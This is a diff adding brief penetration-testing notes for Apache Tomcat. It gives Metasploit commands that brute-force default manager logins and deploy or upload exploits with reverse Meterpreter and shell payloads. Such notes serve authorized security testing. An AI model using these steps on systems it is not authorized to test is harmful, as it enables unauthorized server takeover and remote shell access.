@@ -1,1 +1,23 @@
+# Pentesting Apache Tomcat
+
+# Bruteforce Login
+msf > use auxiliary/scanner/http/tomcat_mgr_login
+;; which checks for default tomcat username and passwords using the above module
+msf > run
+;; or on multiplt instances (note that here we use 8080, but sometimes tomcat is on 8443, 80, 1311, 8081)
+msf > services -p 8080 -S "Tomcat Manager" -R
+
+
+# Exploiting Tomcat (Way 1)
 msf > use exploit/multi/http/tomcat_mgr_deploy
+
+msf > set payload java/meterpreter/reverse_https    ;; to directly get a meterpreter shell.
+msf > set payload java/shell/reverse_tcp            ;; to get the system level shell
+
+# Exploiting Tomcat (Way 2)
+msf > use exploit/multi/http/tomcat_mgr_upload
+
+msf > set payload java/meterpreter/reverse_https    ;; to directly get a meterpreter shell.
+msf > set payload java/shell/reverse_tcp            ;; to get the system level shell
+
+
